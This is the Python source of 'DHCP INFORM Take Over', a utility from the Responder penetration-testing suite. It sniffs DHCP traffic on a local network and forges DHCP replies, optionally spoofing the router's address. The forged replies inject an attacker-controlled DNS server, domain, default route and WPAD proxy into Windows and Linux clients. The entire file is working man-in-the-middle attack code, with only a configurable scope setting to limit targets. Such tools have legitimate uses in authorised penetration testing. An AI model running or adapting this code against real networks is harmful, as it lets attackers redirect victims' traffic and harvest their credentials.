#! /usr/bin/env python
# This utility is part of NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
import sys,struct,socket,re,optparse,ConfigParser,os
from odict import OrderedDict
from socket import inet_aton, inet_ntoa


parser = optparse.OptionParser(usage='python %prog -I eth0 -i 10.20.30.40 -d pwned.com -p 10.20.30.40 -s 10.20.30.1 -r 10.20.40.1',
                               prog=sys.argv[0],
                               )
parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")

parser.add_option('-d', '--dnsname',action="store", help="DNS name to inject, if you don't want to inject a DNS server, provide the original one.", metavar="pwned.com", default="pwned.com",dest="DNSNAME")

parser.add_option('-r', '--router',action="store", help="The ip address of the router or yours if you want to intercept traffic.", metavar="10.20.1.1",dest="RouterIP")

parser.add_option('-p', '--primary',action="store", help="The ip address of the original primary DNS server or yours", metavar="10.20.1.10",dest="DNSIP")

parser.add_option('-s', '--secondary',action="store", help="The ip address of the original secondary DNS server or yours", metavar="10.20.1.11",dest="DNSIP2")

parser.add_option('-n', '--netmask',action="store", help="The netmask of this network", metavar="255.255.255.0", default="255.255.255.0", dest="Netmask")

parser.add_option('-I', '--interface',action="store", help="Interface name to use, example: eth0", metavar="eth0",dest="Interface")

parser.add_option('-w', '--wpadserver',action="store", help="Your WPAD server, finish the string with '\\n'", metavar="\"http://wpadsrv/wpad.dat\\n\"", default="\n", dest="WPAD")

parser.add_option('-S',action="store_true", help="Spoof the router ip address",dest="Spoof")

parser.add_option('-R',action="store_true", help="Respond to DHCP Requests, inject linux clients (very noisy, this is sent on 255.255.255.255)", dest="Request")

options, args = parser.parse_args()

def ShowWelcome():
    Message = 'DHCP INFORM Take Over 0.2\nAuthor: Laurent Gaffie\nPlease send bugs/comments/pcaps to: lgaffie@trustwave.com\nBy default, this script will only inject a new DNS/WPAD server to a Windows <= XP/2003 machine.\nTo inject a DNS server/domain/route on a Windows >= Vista and any linux box, use -R (can be noisy)\n\033[1m\033[31mUse Responder.conf\'s RespondTo setting for in-scope only targets\033[0m\n'
    print Message

if options.OURIP is None:
    print "\n\033[1m\033[31m-i mandatory option is missing, please provide your IP address.\033[0m\n"
    parser.print_help()
    exit(-1)

if options.Interface is None:
    print "\n\033[1m\033[31m-I mandatory option is missing, please provide an interface.\033[0m\n"
    parser.print_help()
    exit(-1)

if options.RouterIP is None:
    print "\n\033[1m\033[31m-r mandatory option is missing, please provide the router's IP.\033[0m\n"
    parser.print_help()
    exit(-1)

if options.DNSIP is None:
    print "\n\033[1m\033[31m-p mandatory option is missing, please provide the primary DNS server ip address or yours.\033[0m\n"
    parser.print_help()
    exit(-1)

if options.DNSIP2 is None:
    print "\n\033[1m\033[31m-s mandatory option is missing, please provide the secondary DNS server ip address or yours.\033[0m\n"
    parser.print_help()
    exit(-1)

ShowWelcome()

#Config parsing
ResponderPATH = os.path.dirname(__file__)
config = ConfigParser.ConfigParser()
config.read(os.path.join(ResponderPATH,'Responder.conf'))
RespondTo = config.get('Responder Core', 'RespondTo').strip()

#Setting some vars
Interface = options.Interface
OURIP = options.OURIP
ROUTERIP = options.RouterIP
NETMASK = options.Netmask
DHCPSERVER = options.OURIP
DNSIP = options.DNSIP
DNSIP2 = options.DNSIP2
DNSNAME = options.DNSNAME
WPADSRV = options.WPAD
Spoof = options.Spoof
Request = options.Request

if Spoof:
    DHCPSERVER = ROUTERIP

def SpoofIP(Spoof):
    if Spoof:
        return ROUTERIP
    else:
        return OURIP

def RespondToSpecificHost(RespondTo):
    if len(RespondTo)>=1 and RespondTo != ['']:
        return True
    else:
        return False

def RespondToIPScope(RespondTo, ClientIp):
    if ClientIp in RespondTo:
        return True
    else:
        return False

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))


#####################################################################
# Server Stuff
#####################################################################

class IPHead(Packet):
    fields = OrderedDict([
        ("Version",           "\x45"),
        ("DiffServices",      "\x00"),
        ("TotalLen",          "\x00\x00"),
        ("Ident",             "\x00\x00"),
        ("Flags",             "\x00\x00"),
        ("TTL",               "\x40"),
        ("Protocol",          "\x11"),
        ("Checksum",          "\x00\x00"),
        ("SrcIP",             ""),
        ("DstIP",             ""),
    ])

class UDP(Packet):
    fields = OrderedDict([
        ("SrcPort",           "\x00\x43"),
        ("DstPort",           "\x00\x44"),
        ("Len",               "\x00\x00"),
        ("Checksum",          "\x00\x00"),
        ("Data",              "\x00\x00"),
    ])

    def calculate(self):
        self.fields["Len"] = struct.pack(">h",len(str(self.fields["Data"]))+8)##include udp packet.

class DHCPACK(Packet):
    fields = OrderedDict([
        ("MessType",          "\x02"),
        ("HdwType",           "\x01"),
        ("HdwLen",            "\x06"),
        ("Hops",              "\x00"),
        ("Tid",               "\x22\x1b\xe0\x1a"),
        ("ElapsedSec",        "\x00\x00"),
        ("BootpFlags",        "\x00\x00"),
        ("ActualClientIP",    "\x00\x00\x00\x00"),
        ("GiveClientIP",      "\x00\x00\x00\x00"),
        ("NextServerIP",      "\x00\x00\x00\x00"),
        ("RelayAgentIP",      "\x00\x00\x00\x00"),
        ("ClientMac",         "\xb8\x76\x3f\xbd\xdd\x05"),
        ("ClientMacPadding",  "\x00" *10),
        ("ServerHostname",    "\x00" * 64),
        ("BootFileName",      "\x00" * 128),
        ("MagicCookie",       "\x63\x82\x53\x63"),
        ("DHCPCode",          "\x35"),    #DHCP Message
        ("DHCPCodeLen",       "\x01"),
        ("DHCPOpCode",        "\x05"),    #Msgtype(ACK)
        ("Op54",              "\x36"),
        ("Op54Len",           "\x04"),
        ("Op54Str",           ""),                #DHCP Server
        ("Op51",              "\x33"),
        ("Op51Len",           "\x04"),
        ("Op51Str",           "\x00\x01\x51\x80"), #Lease time, 1 day.
        ("Op1",               "\x01"),
        ("Op1Len",            "\x04"),
        ("Op1Str",            ""),                  #Netmask
        ("Op15",              "\x0f"),
        ("Op15Len",           "\x0e"),
        ("Op15Str",           DNSNAME),             #DNS Name
        ("Op3",               "\x03"),
        ("Op3Len",            "\x04"),
        ("Op3Str",            ""),                  #Router
        ("Op6",               "\x06"),
        ("Op6Len",            "\x08"),
        ("Op6Str",            ""),                  #DNS Servers
        ("Op252",              "\xfc"),
        ("Op252Len",           "\x04"),
        ("Op252Str",           WPADSRV),            #Wpad Server.
        ("Op255",             "\xff"),
        ("Padding",           "\x00"),

    ])

    def calculate(self):
        self.fields["Op54Str"] = inet_aton(DHCPSERVER)
        self.fields["Op1Str"] = inet_aton(NETMASK)
        self.fields["Op3Str"] = inet_aton(ROUTERIP)
        self.fields["Op6Str"] = inet_aton(DNSIP)+inet_aton(DNSIP2)
        self.fields["Op15Len"] = struct.pack(">b",len(DNSNAME))
        self.fields["Op252Len"] = struct.pack(">b",len(WPADSRV))

class DHCPInformACK(Packet):
    fields = OrderedDict([
        ("MessType",          "\x02"),
        ("HdwType",           "\x01"),
        ("HdwLen",            "\x06"),
        ("Hops",              "\x00"),
        ("Tid",               "\x22\x1b\xe0\x1a"),
        ("ElapsedSec",        "\x00\x00"),
        ("BootpFlags",        "\x00\x00"),
        ("ActualClientIP",    "\x00\x00\x00\x00"),
        ("GiveClientIP",      "\x00\x00\x00\x00"),
        ("NextServerIP",      "\x00\x00\x00\x00"),
        ("RelayAgentIP",      "\x00\x00\x00\x00"),
        ("ClientMac",         "\xb8\x76\x3f\xbd\xdd\x05"),
        ("ClientMacPadding",  "\x00" *10),
        ("ServerHostname",    "\x00" * 64),
        ("BootFileName",      "\x00" * 128),
        ("MagicCookie",       "\x63\x82\x53\x63"),
        ("Op53",              "\x35\x01\x05"),      #Msgtype(ACK)
        ("Op54",              "\x36"),
        ("Op54Len",           "\x04"),
        ("Op54Str",           ""),                  #DHCP Server
        ("Op1",               "\x01"),
        ("Op1Len",            "\x04"),
        ("Op1Str",            ""),                  #Netmask
        ("Op15",              "\x0f"),
        ("Op15Len",           "\x0e"),
        ("Op15Str",           DNSNAME),             #DNS Name
        ("Op3",               "\x03"),
        ("Op3Len",            "\x04"),
        ("Op3Str",            ""),                  #Router
        ("Op6",               "\x06"),
        ("Op6Len",            "\x08"),
        ("Op6Str",            ""),                  #DNS Servers
        ("Op252",              "\xfc"),
        ("Op252Len",           "\x04"),
        ("Op252Str",           WPADSRV),            #Wpad Server.
        ("Op255",             "\xff"),

    ])

    def calculate(self):
        self.fields["Op54Str"] = inet_aton(DHCPSERVER)
        self.fields["Op1Str"] = inet_aton(NETMASK)
        self.fields["Op3Str"] = inet_aton(ROUTERIP)
        self.fields["Op6Str"] = inet_aton(DNSIP)+inet_aton(DNSIP2)
        self.fields["Op15Len"] = struct.pack(">b",len(DNSNAME))
        self.fields["Op252Len"] = struct.pack(">b",len(WPADSRV))

def ParseMac(data):
    return '\nDst mac:%s SrcMac:%s'%(data[0][0:6].encode('hex'),data[0][6:12].encode('hex'))

def IsUDP(data):
    if data[0][23:24] == "\x11":
        return True
    if data[0][23:24] == "\x06":
        return False

def ParseSrcDSTAddr(data):
    SrcIP = inet_ntoa(data[0][26:30])
    DstIP = inet_ntoa(data[0][30:34])
    SrcPort = struct.unpack('>H',data[0][34:36])[0]
    DstPort = struct.unpack('>H',data[0][36:38])[0]
    return SrcIP,SrcPort,DstIP,DstPort

def FindIP(data):
    IP = ''.join(re.findall('(?<=\x32\x04)[^EOF]*', data))
    return ''.join(IP[0:4])

def ParseDHCPCode(data):
    PTid = data[4:8]
    Seconds = data[8:10]
    CurrentIP = inet_ntoa(data[12:16])
    RequestedIP = inet_ntoa(data[16:20])
    MacAddr = data[28:34]
    OpCode = data[242:243]
    RequestIP = data[245:249]
    if OpCode == "\x08":
        i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=inet_aton(CurrentIP))
        p = DHCPInformACK(Tid=PTid,ClientMac=MacAddr, ActualClientIP=inet_aton(CurrentIP), GiveClientIP=inet_aton("0.0.0.0"), NextServerIP=inet_aton("0.0.0.0"),RelayAgentIP=inet_aton("0.0.0.0"),BootpFlags="\x00\x00",ElapsedSec=Seconds)
        p.calculate()
        u = UDP(Data = p)
        u.calculate()
        for x in range(1):
            SendDHCP(str(i)+str(u),(CurrentIP,68))
        return '\033[1m\033[31mDHCP Inform received:\033[0m Current IP:%s Requested IP:%s Mac Address:%s Tid:%s'%(CurrentIP,RequestedIP,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))

    if OpCode == "\x03":
        if Request:
            IP = FindIP(data)
            if IP:
                IPConv = inet_ntoa(IP)
                if RespondToSpecificHost(RespondTo) and RespondToIPScope(RespondTo, IPConv):
                    i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
                    p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00",ElapsedSec=Seconds)
                    p.calculate()
                    u = UDP(Data = p)
                    u.calculate()
                    for x in range(1):
                        SendDHCP(str(i)+str(u),(IPConv,68))
                    return '\033[1m\033[31mIn-scope DHCP Request received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))
                if RespondToSpecificHost(RespondTo) == False:
                    i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
                    p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00",ElapsedSec=Seconds)
                    p.calculate()
                    u = UDP(Data = p)
                    u.calculate()
                    for x in range(1):
                        SendDHCP(str(i)+str(u),(IPConv,68))
                    return '\033[1m\033[31mDHCP Request received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))

    if OpCode == "\x01":
        if Request:
            IP = FindIP(data)
            if IP:
                IPConv = inet_ntoa(IP)
                if RespondToSpecificHost(RespondTo) and RespondToIPScope(RespondTo, IPConv):
                    i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
                    p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00", DHCPOpCode="\x02", ElapsedSec=Seconds)
                    p.calculate()
                    u = UDP(Data = p)
                    u.calculate()
                    for x in range(1):
                        SendDHCP(str(i)+str(u),(IPConv,0))
                    return '\033[1m\033[31mIn-scope DHCP Discover received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))
                if RespondToSpecificHost(RespondTo) == False:
                    i = IPHead(SrcIP = inet_aton(SpoofIP(Spoof)), DstIP=IP)
                    p = DHCPACK(Tid=PTid,ClientMac=MacAddr, GiveClientIP=IP,BootpFlags="\x00\x00", DHCPOpCode="\x02", ElapsedSec=Seconds)
                    p.calculate()
                    u = UDP(Data = p)
                    u.calculate()
                    for x in range(1):
                        SendDHCP(str(i)+str(u),(IPConv,0))
                    return '\033[1m\033[31mDHCP Discover received:\033[0m Requested IP: %s Mac Address: %s Tid: %s'%(IPConv,'-'.join('%02x' % ord(m) for m in MacAddr),'0x'+PTid.encode('hex'))

    else:
        return False


def SendDHCP(packet,Host):
    Protocol = 0x0800
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.sendto(packet, Host)

def SniffUDPMac():
    s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
    Protocol = 0x0800
    s.bind((Interface, Protocol))
    while True:
        data = s.recvfrom(65535)
        if IsUDP(data):
            SrcIP,SrcPort,DstIP,DstPort =  ParseSrcDSTAddr(data)
            if SrcPort == 67 or DstPort == 67:
                Message = ParseDHCPCode(data[0][42:])
                if Message:
                    print 'DHCP Packet:\nSource IP/Port : %s:%s Destination IP/Port: %s:%s'%(SrcIP,SrcPort,DstIP,DstPort)
                    print Message


SniffUDPMac()
